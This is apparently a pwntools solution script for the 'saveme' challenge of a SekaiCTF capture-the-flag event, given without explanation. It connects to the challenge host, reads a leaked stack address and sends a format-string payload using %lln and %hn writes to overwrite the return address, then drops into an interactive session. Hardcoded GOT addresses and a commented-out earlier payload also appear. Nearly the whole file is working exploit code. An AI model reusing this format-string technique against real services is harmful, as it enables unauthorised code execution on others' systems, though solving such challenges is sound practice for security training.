#!/usr/bin/env python3

from pwn import *

pwn = './saveme'
host = 'challs.ctf.sekai.team'
port = 4001
gdbscript = '''
b * 0x401531
b * 0x4013f4
b * 0x401551
continue
'''
elf = ELF(pwn)
libc = ELF('libc.so.6')

def pad(string):
	if len(string) > 79:
		raise Exception("string too long")		
	return string + b'A'*(79 - len(string))

def conn():
	if args.REMOTE:
		return remote(host,port)
	else:
		if args.GDB:
			return gdb.debug(pwn,gdbscript=gdbscript)
		else:
			return process(pwn)

io = conn()
io.recvuntil(b'gift: ')
buffer_address = int(io.recv(14).decode(),16)
ret_address =  buffer_address + 0x68
rwx_segment_start = 0x405000
main = 0x4013f4
putc_got = 0x404070
putc_ret = 0x4014f9
malloc_got = 0x404078
malloc_ret = 0x4013f2
seccomp_got = 0x404018
setbuf_got = 0x404048
io.recvuntil(b'option: ')
io.sendline(b'2')
io.recvuntil(b'person: ')
# payload = pad(b'%64x%14$lln%5305x%13$hn%65273x%15$llnAAA' + p64(ret_address) + p64(ret_address+2) + \
# 		  p64(malloc_got))

payload = pad(b'%64x%12$lln%5288x%11$hnA' + p64(ret_address) + p64(ret_address+2))

io.sendline(payload)


io.interactive()